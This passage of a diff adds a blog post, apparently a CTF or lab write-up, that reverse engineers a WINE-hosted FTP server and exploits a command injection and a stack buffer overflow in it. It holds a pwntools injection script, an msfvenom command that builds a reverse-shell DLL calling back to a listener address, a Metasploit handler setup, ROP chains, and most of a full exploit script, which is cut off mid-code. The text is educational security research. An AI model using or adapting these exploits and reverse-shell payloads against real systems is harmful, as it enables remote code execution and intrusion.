+<span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span> <span class="p">(</span><span class="n">fp</span><span class="o">.</span><span class="n">readlines</span> <span class="p">()):</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span> <span class="p">(</span><span class="s">' +'</span><span class="p">,</span> <span class="s">' '</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
+    <span class="n">fields</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span> <span class="p">(</span><span class="s">' '</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">field</span> <span class="ow">in</span> <span class="n">fields</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">is_valid_hex</span> <span class="p">(</span><span class="n">field</span><span class="p">):</span>
+            <span class="n">content</span> <span class="o">+=</span> <span class="n">field</span><span class="o">.</span><span class="n">decode</span> <span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+<span class="n">fp</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>
+
+<span class="n">fp_out</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span>
+<span class="n">fp_out</span><span class="o">.</span><span class="n">write</span> <span class="p">(</span><span class="n">content</span><span class="p">)</span>
+<span class="n">fp_out</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>When we rebuild the binary from the hexdump (the ftp104.bkp file),
+we get a PE binary. The PE executable format is mainly used on Windows,
+here we know that we got a Linux distribution so chances are that
+this executable is running under WINE.
+WINE is a re-implementation of the Windows API by using the Posix API,
+this allows to run Windows apps on compatible Unixes.</p>
+
+<p>When running our binary with WINE, we get an error about needing “bfsvrdll.dll”.
+Let’s check if there is anything else in there with binwalk.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="code"><pre>$ binwalk ftp104.bin 
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Microsoft executable, portable (PE)
+328240        0x50230         Unix path: /debian/tmp/usr/i686-w64-mingw32/include/psdk_inc
+329269        0x50635         Unix path: /debian/tmp/usr/i686-w64-mingw32/include
+335092        0x51CF4         Unix path: /debian/tmp/usr/i686-w64-mingw32/include
+337137        0x524F1         Unix path: /debian/tmp/usr/i686-w64-mingw32/include/psdk_inc
+379576        0x5CAB8         Microsoft executable, portable (PE)
+621288        0x97AE8         Unix path: /debian/tmp/usr/i686-w64-mingw32/include/psdk_inc
+622223        0x97E8F         Unix path: /debian/tmp/usr/i686-w64-mingw32/include
+626096        0x98DB0         Unix path: /debian/tmp/usr/i686-w64-mingw32/include
+627522        0x99342         Unix path: /debian/tmp/usr/i686-w64-mingw32/include</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>There are in fact 2 binaries.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="code"><pre>$ dd if=ftp104.bin of=ftp.exe bs=1 count=379576
+379576+0 records in
+379576+0 records out
+379576 bytes (380 kB, 371 KiB) copied, 0.413207 s, 919 kB/s
+$ file ftp.exe 
+ftp.exe: PE32 executable (console) Intel 80386, for MS Windows
+$ dd if=ftp104.bin of=bfsvrdll.dll bs=1 skip=379576
+278766+0 records in
+278766+0 records out
+278766 bytes (279 kB, 272 KiB) copied, 0.287341 s, 970 kB/s
+$ file bsvrdll.dll 
+bfsvrdll.dll: PE32 executable (DLL) (console) Intel 80386, for MS Windows</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>Now our binary runs properly.</p>
+
+<p>Let’s hunt for vulnerabilities in that binary.
+I decided to use reverse engineering rather than fuzzing to find vulnerabilities
+as the binary is small.</p>
+
+<h1 id="reverse-engineering">Reverse Engineering</h1>
+
+<p>We know it’s a FTP server so vulnerabilities will be located in one of the
+command handlers in the dispatch switch case.</p>
+
+<p>I ended up finding 2 remotely exploitable vulnerabilities.
+1 command injection and 1 buffer overflow.</p>
+
+<p>Reading the basic block located at 0x4021F5, we can see there is
+a command injection vulnerability as it’s constructing a command as follow:
+explorer [url]</p>
+
+<p>The command injection is unfortunately not exploitable on the target VM
+but it is exploitable on a lab box though.
+The vulnerability is triggered by sending a string in the following form:</p>
+<ul>
+  <li>http:[some_url] &amp;&amp; [cmd]</li>
+  <li>https:[some_url] &amp;&amp; [cmd]</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+</pre></td><td class="code"><pre>.text:004021B3 loc_4021B3:                             ; CODE XREF: _ConnectionHandler@4+687 j
+.text:004021B3                 mov     dword ptr [esp+8], 5 ; size_t
+.text:004021BB                 mov     dword ptr [esp+4], offset aHttp ; "http:"
+.text:004021C3                 mov     eax, [ebp+cmd]
+.text:004021C6                 mov     [esp], eax      ; char *
+.text:004021C9                 call    _strncmp
+.text:004021CE                 test    eax, eax
+.text:004021D0                 jz      short cmd_injection
+.text:004021D2                 mov     dword ptr [esp+8], 6 ; size_t
+.text:004021DA                 mov     dword ptr [esp+4], offset aHttps ; "https:"
+.text:004021E2                 mov     eax, [ebp+cmd]
+.text:004021E5                 mov     [esp], eax      ; char *
+.text:004021E8                 call    _strncmp
+.text:004021ED                 test    eax, eax
+.text:004021EF                 jnz     loc_4022AD
+.text:004021F5
+.text:004021F5 cmd_injection:                          ; CODE XREF: _ConnectionHandler@4+6FD j
+.text:004021F5                 mov     dword ptr [ebp+var_4F3], 52677542h
+.text:004021FF                 mov     [ebp+var_4EF], 726F7065h
+.text:00402209                 mov     [ebp+var_4EB], 694C2074h
+.text:00402213                 mov     [ebp+var_4E7], 53206B6Eh
+.text:0040221D                 mov     [ebp+var_4E3], 20746E65h
+.text:00402227                 mov     [ebp+var_4DF], 42206F74h
+.text:00402231                 mov     [ebp+var_4DB], 2E2E626Fh
+.text:0040223B                 mov     [ebp+var_4D7], 74660A2Eh
+.text:00402245                 mov     [ebp+var_4D3], 3E70h
+.text:0040224F                 mov     eax, [ebp+cmd]
+.text:00402252                 mov     [esp+4], eax    ; char *
+.text:00402256                 mov     dword ptr [esp], offset aExplorer ; "explorer "
+.text:0040225D                 call    _concat
+.text:00402262                 mov     [ebp+var_40], eax
+.text:00402265                 mov     eax, [ebp+var_40]
+.text:00402268                 mov     [esp], eax      ; char *
+.text:0040226B                 call    _system
+.text:00402270                 mov     eax, [ebp+var_40]
+.text:00402273                 mov     [esp], eax      ; void *
+.text:00402276                 call    _free
+.text:0040227B                 mov     dword ptr [esp+0Ch], 0 ; flags
+.text:00402283                 mov     dword ptr [esp+8], 24h ; len
+.text:0040228B                 lea     eax, [ebp+var_4F3]
+.text:00402291                 mov     [esp+4], eax    ; buf
+.text:00402295                 mov     eax, [ebp+sock]
+.text:00402298                 mov     [esp], eax      ; s
+.text:0040229B                 mov     eax, ds:__imp__send@16
+.text:004022A0                 call    eax ; __imp__send@16
+.text:004022A2                 sub     esp, 10h
+.text:004022A5                 mov     [ebp+var_1C], eax
+.text:004022A8                 jmp     loc_403A5A</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>The buffer overflow on the other hand is quite exploitable.</p>
+
+<p>First the handler get triggered when we send “cd [cmd]”.
+Then the vulnerable function is triggered if there is a ‘.’ in
+the “[cmd]” string.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+</pre></td><td class="code"><pre>.text:004036D1 loc_4036D1:                             ; CODE XREF: _ConnectionHandler@4+1B61 j
+.text:004036D1                 mov     dword ptr [esp+8], 3 ; size_t
+.text:004036D9                 mov     dword ptr [esp+4], offset aCd ; "cd "
+.text:004036E1                 mov     eax, [ebp+cmd]
+.text:004036E4                 mov     [esp], eax      ; char *
+.text:004036E7                 call    _strncmp
+.text:004036EC                 test    eax, eax
+.text:004036EE                 jz      short loc_403713
+.text:004036F0                 mov     dword ptr [esp+8], 3 ; size_t
+.text:004036F8                 mov     dword ptr [esp+4], offset aCd_0 ; "CD "
+.text:00403700                 mov     eax, [ebp+cmd]
+.text:00403703                 mov     [esp], eax      ; char *
+.text:00403706                 call    _strncmp
+.text:0040370B                 test    eax, eax
+.text:0040370D                 jnz     loc_403854
+.text:00403713
+.text:00403713 loc_403713:                             ; CODE XREF: _ConnectionHandler@4+1C1B j
+.text:00403713                 mov     dword ptr [esp], 64h ; size_t
+.text:0040371A                 call    _malloc
+.text:0040371F                 mov     [ebp+tmp_buf], eax
+.text:00403722                 mov     dword ptr [esp+8], 64h ; size_t
+.text:0040372A                 mov     dword ptr [esp+4], 0 ; int
+.text:00403732                 mov     eax, [ebp+tmp_buf]
+.text:00403735                 mov     [esp], eax      ; void *
+.text:00403738                 call    _memset
+.text:0040373D                 mov     dword ptr [ebp+var_4F3], 20303532h
+.text:00403747                 mov     [ebp+var_4EF], 'eriD'
+.text:00403751                 mov     [ebp+var_4EB], 'rotc'
+.text:0040375B                 mov     [ebp+var_4E7], 'us y'
+.text:00403765                 mov     [ebp+var_4E3], 'secc'
+.text:0040376F                 mov     [ebp+var_4DF], 'lufs'
+.text:00403779                 mov     [ebp+var_4DB], 'c yl'
+.text:00403783                 mov     [ebp+var_4D7], 'gnah'
+.text:0040378D                 mov     [ebp+var_4D3], 220A6465h
+.text:00403797                 mov     [ebp+var_4CF], 660A222Fh
+.text:004037A1                 mov     [ebp+var_4CB], 3E7074h
+.text:004037AB                 lea     eax, [ebp+var_4C7]
+.text:004037B1                 mov     ecx, 0CFh
+.text:004037B6                 mov     ebx, 0
+.text:004037BB                 mov     [eax], ebx
+.text:004037BD                 mov     [eax+ecx-4], ebx
+.text:004037C1                 lea     edx, [eax+4]
+.text:004037C4                 and     edx, 0FFFFFFFCh
+.text:004037C7                 sub     eax, edx
+.text:004037C9                 add     ecx, eax
+.text:004037CB                 and     ecx, 0FFFFFFFCh
+.text:004037CE                 shr     ecx, 2
+.text:004037D1                 mov     edi, edx
+.text:004037D3                 mov     eax, ebx
+.text:004037D5                 rep stosd
+.text:004037D7                 mov     [ebp+idx_cmd], 2
+.text:004037DE                 jmp     short loc_40381A
+.text:004037E0 ; ---------------------------------------------------------------------------
+.text:004037E0
+.text:004037E0 loc_4037E0:                             ; CODE XREF: _ConnectionHandler@4+1D4D j
+.text:004037E0                 mov     edx, [ebp+idx_cmd]
+.text:004037E3                 mov     eax, [ebp+cmd]
+.text:004037E6                 add     eax, edx
+.text:004037E8                 movzx   eax, byte ptr [eax]
+.text:004037EB                 cmp     al, '.'
+.text:004037ED                 jnz     short loc_403816
+.text:004037EF
+.text:004037EF vuln_branch:                            ; size_t
+.text:004037EF                 mov     dword ptr [esp+8], 64h
+.text:004037F7                 mov     eax, [ebp+cmd]
+.text:004037FA                 mov     [esp+4], eax    ; char *
+.text:004037FE                 mov     eax, [ebp+tmp_buf]
+.text:00403801                 mov     [esp], eax      ; char *
+.text:00403804                 call    _strncpy
+.text:00403809                 mov     eax, [ebp+tmp_buf]
+.text:0040380C                 mov     [esp], eax      ; buf
+.text:0040380F                 call    vuln_function
+.text:00403814                 jmp     short loc_403822</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>The vulnerable function calls strcpy() !!!
+A classic textbook stack based buffer overflow.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="code"><pre>.text:00401AB8 ; char *__cdecl vuln_function(char *buf)
+.text:00401AB8                 public vuln_function
+.text:00401AB8 vuln_function   proc near               ; CODE XREF: _ConnectionHandler@4+1D3C p
+.text:00401AB8
+.text:00401AB8 local_buf       = byte ptr -2Eh
+.text:00401AB8 buf             = dword ptr  8
+.text:00401AB8
+.text:00401AB8                 push    ebp
+.text:00401AB9                 mov     ebp, esp
+.text:00401ABB                 sub     esp, 48h
+.text:00401ABE                 mov     eax, [ebp+buf]
+.text:00401AC1                 mov     [esp+4], eax    ; char *
+.text:00401AC5                 lea     eax, [ebp+local_buf]
+.text:00401AC8                 mov     [esp], eax      ; char *
+.text:00401ACB                 call    _strcpy
+.text:00401AD0                 nop
+.text:00401AD1                 leave
+.text:00401AD2                 retn
+.text:00401AD2 vuln_function   endp</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>Exploitation of both vulnerabilities will be detailed.</p>
+
+<h1 id="exploitation--command-injection">Exploitation : Command Injection</h1>
+
+<p>A command injection is possible when a command string is built and used in a system() equivalent call using improperly filtered or unfiltered user input.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python2
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'Usage : </span><span class="si">%</span><span class="s">s ip'</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="mi">20021</span><span class="p">)</span>
+<span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'http://</span><span class="si">%</span><span class="s">s &amp;&amp; rundll32 Z:</span><span class="se">\\</span><span class="s">ftpsrv</span><span class="se">\\</span><span class="s">bkp</span><span class="se">\\</span><span class="s">shell.dll '</span> <span class="o">%</span> <span class="n">target_ip</span><span class="p">)</span>
+<span class="n">target</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>Since it is a Linux target, we can embed a Linux payload into a DLL using msfvenom:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre>$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f dll &gt; shell.dll</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>The buffer overflow is reliably exploitable for remote arbitrary code execution
+as shown in the next section.</p>
+
+<h1 id="exploitation--buffer-overflow">Exploitation : Buffer Overflow</h1>
+
+<p>The difficulty of exploitation resides in the limited available size for
+our payload.
+Since apparently NX is enabled, options are even more limited.</p>
+
+<p>The ftp_buffer is 0x1000 bytes and there are no characters restrictions since
+the FTP server uses recv(). The only restriction is not to have any ‘\x00’ in our
+buffer as it would truncate our copy in the vuln_function().
+The vulnerable handler copies at most 0x64 bytes = 100 bytes in its tmp_buf,
+our vuln_function() buffer is 0x2e = 46 bytes. So SEBP and SEIP will be
+overwritten respectly at offset 42 and 46 of tmp_buf. We thus have around 50
+bytes for our ROP payload, or space for roughly 12 values/pointers.</p>
+
+<p>12 values/pointers … that indeed restrict our options by quite a bit.
+Given the right gadgets this limitation can be bypassed to have arbitrary
+code execution.
+By chance, there is no ASLR for the .exe and .dll used. I didn’t find any infoleak vulnerability
+so if ASLR were to be in play, it probably wouldn’t be exploitable.</p>
+
+<p>Luckily for us, we find the necessary gadgets for our exploitation to proceed.
+The gadget I was looking for was a ‘mov dword ptr [register], value’ patch kind.
+I ended up finding ‘add dword ptr [ebx + 0x5e5b30c4], eax ; pop edi ; ret’,
+this does the job. The only pre-requisites are to know memory state when the
+gadget execute and no ‘\x00’ when setting ebx value.</p>
+
+<p>The core of my exploit resides in the following routine:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="code"><pre><span class="k">def</span> <span class="nf">patch_once</span> <span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+    <span class="n">ropchain</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="c1"># pop eax ; ret
+</span>        <span class="mh">0x625014d5</span><span class="p">,</span>
+        <span class="n">value</span><span class="p">,</span>
+        <span class="c1"># pop ebx ; ret
+</span>        <span class="mh">0x62501033</span><span class="p">,</span>
+        <span class="n">boundint</span> <span class="p">(</span><span class="n">addr</span> <span class="o">-</span> <span class="mh">0x5e5b30c4</span><span class="p">,</span> <span class="mi">32</span><span class="p">),</span>
+        <span class="c1"># add dword ptr [ebx + 0x5e5b30c4], eax ; pop edi ; ret
+</span>        <span class="mh">0x62501a45</span><span class="p">,</span>
+        <span class="c1"># junk
+</span>        <span class="mh">0x12345678</span><span class="p">,</span>
+        <span class="c1"># ExitThread (0x87654321)
+</span>        <span class="n">func_ExitThread</span><span class="p">,</span>
+        <span class="mh">0x87654321</span>
+    <span class="p">]</span>
+
+    <span class="k">return</span> <span class="n">pack_rop</span> <span class="p">(</span><span class="n">ropchain</span><span class="p">)</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>This allows us to write 4 bytes at an arbitrary location (provided the target
+address doesn’t have any NULL bytes).
+For each client that connects, the FTP server creates a thread to handle it.
+It is quite advantageous to us : we don’t have to bother restoring ESP and/or
+EBP, we just use ExitThread() and let WINE do the job for us.
+At each connection we’ll thus write only 4 bytes.</p>
+
+<p>The exploit proceeds as follow:</p>
+<ul>
+  <li>Write VirtualAlloc() ROP payload</li>
+  <li>Run it to allocate memory</li>
+  <li>Write system() ROP payload</li>
+  <li>Run a command with system() (this can be removed since the rundll32 trick
+doesn’t work on the target VM even if it does in the lab)</li>
+  <li>Copy shellcode to the earlier alloced memory</li>
+  <li>Execute arbitrary shellcode</li>
+</ul>
+
+<p>For the exploit to work, you need to change the shellcode as this was tailored
+for my usage.</p>
+
+<p>Another difficulty is finding which precise WINE version our target VM uses.
+That’s where the security patch (August) level helped.
+I did the development on my Ubuntu 14.04 lab box.
+Multiple WINE libs found here were tried : https://dl.winehq.org/wine-builds/ubuntu/pool/main/ .
+You can find our target’s VM one here : https://dl.winehq.org/wine-builds/ubuntu/pool/main/wine-stable-i386_2.0.2~trusty_i386.deb .</p>
+
+<p>To make the exploit more reliable:</p>
+<ul>
+  <li>support multiple WINE versions</li>
+  <li>cleanup after the exploit : restore the memory state as it was before
+exploitation</li>
+</ul>
+
+<h1 id="metasploit-handler">Metasploit handler</h1>
+
+<p>We configure our metasploit handler to get our reverse shell.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td><td class="code"><pre>msf exploit(handler) &gt; show options 
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+Payload options (linux/x86/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   CMD    /bin/bash -p     yes       The command string to execute
+   LHOST  192.168.56.102   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+msf exploit(handler) &gt; exploit 
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 192.168.56.102:4444</pre></td></tr></tbody></table></code></pre></figure>
+
+<h1 id="the-exploit">The exploit</h1>
+
+<p>Here it finally is.
+Don’t forget to change the used shellcode with yours, otherwise it just won’t work.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python2
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">MEM_COMMIT</span>  <span class="o">=</span> <span class="mh">0x1000</span>
+<span class="n">MEM_RESERVE</span> <span class="o">=</span> <span class="mh">0x2000</span>
+<span class="n">PAGE_EXECUTE_READWRITE</span> <span class="o">=</span> <span class="mh">0x40</span>
+<span class="c1"># kernel32.dll
+</span><span class="n">func_VirtualAlloc</span> <span class="o">=</span> <span class="mh">0x7b485b20</span>
+<span class="n">func_ExitThread</span> <span class="o">=</span> <span class="mh">0x7b480af0</span>
+<span class="c1"># ftp
+</span><span class="n">func_system</span> <span class="o">=</span> <span class="mh">0x404c1c</span>
+<span class="c1"># bfsvrdll.dll
+</span><span class="n">addr_ret</span> <span class="o">=</span> <span class="mh">0x6250210F</span>
+<span class="c1"># pivot
+</span><span class="n">addr_leave</span> <span class="o">=</span> <span class="mh">0x62501497</span>
+<span class="c1"># system payload
+</span><span class="n">addr_rop_system</span> <span class="o">=</span> <span class="mh">0x13374010</span>
+<span class="c1"># cleaner
+</span><span class="n">addr_alloc</span> <span class="o">=</span> <span class="mh">0x13370000</span>
+<span class="n">addr_shellcode</span> <span class="o">=</span> <span class="mh">0x13370000</span> <span class="o">+</span> <span class="mh">0x9010</span>
+
+<span class="k">def</span> <span class="nf">check_ip</span> <span class="p">(</span><span class="n">ip_addr</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">is_valid</span> <span class="o">=</span> <span class="p">[</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">256</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="err">\</span><span class="s">.'</span><span class="p">,</span><span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="s">r'^\d+\.\d+\.\d+\.\d+$'</span><span class="p">,</span> <span class="n">ip_addr</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">]</span><span class="o">.</span><span class="n">count</span> <span class="p">(</span><span class="bp">True</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="k">return</span> <span class="n">is_valid</span>
+
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'Usage: </span><span class="si">%</span><span class="s">s rhost rport'</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
+
+<span class="c1"># validate rhost
+</span><span class="k">if</span> <span class="n">check_ip</span> <span class="p">(</span><span class="n">rhost</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'[-] Invalid IP'</span>
+    <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># validate rport
+</span><span class="k">try</span><span class="p">:</span>
+    <span class="n">rport</span> <span class="o">=</span> <span class="nb">int</span> <span class="p">(</span><span class="n">rport</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'[-] Invalid rport'</span>
+    <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">rport</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="ow">or</span> <span class="mi">65535</span> <span class="o">&lt;</span> <span class="n">rport</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'[-] Invalid rport'</span>
+    <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">sebp</span> <span class="o">=</span> <span class="s">'B'</span> <span class="o">*</span> <span class="mi">4</span><span class="p">):</span>
+    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'cd '</span> <span class="o">+</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">43</span> <span class="o">+</span> <span class="n">sebp</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">'.'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">boundint</span> <span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">nbits</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">((</span><span class="n">val</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">nbits</span><span class="p">))</span> <span class="o">%</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">nbits</span><span class="p">))</span>
+
+<span class="s">'''
+0x62502193 : movzx edx, word ptr [eax + 0x62500006] ; mov eax, edx ; ret
+'''</span>
+
+<span class="k">def</span> <span class="nf">pack_rop</span> <span class="p">(</span><span class="n">ropchain</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span> <span class="p">([</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">ropchain</span> <span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">patch_once</span> <span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+    <span class="n">ropchain</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="c1"># pop eax ; ret
+</span>        <span class="mh">0x625014d5</span><span class="p">,</span>
+        <span class="n">value</span><span class="p">,</span>
+        <span class="c1"># pop ebx ; ret
+</span>        <span class="mh">0x62501033</span><span class="p">,</span>
